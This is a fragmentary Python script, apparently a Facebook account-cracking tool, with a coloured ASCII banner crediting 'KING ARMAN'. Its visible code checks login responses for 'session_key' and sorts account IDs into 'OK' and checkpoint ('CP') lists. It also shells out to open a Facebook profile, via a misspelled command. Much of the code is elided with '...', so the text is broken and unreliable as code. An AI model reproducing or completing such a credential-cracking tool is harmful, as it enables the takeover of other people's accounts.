...
__________________________________________________
 ...
 \033[1;96m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;36mRAEES ARMAN \033[1;96m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            KING ARMAN 
\033[1;92m Facebook:            Arman Khan 
\033[1;92m Github  :            Arman ..
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        exit()
os.system("xd-open https://www.facebook.com/profile.php?id=100000274834300&mibextid=2JQ9oc")
def menu():   
    os.system('clear')
    print(logo)
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    break
                     ...
                     #print(f"\r\x1b[1;96m [HA-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
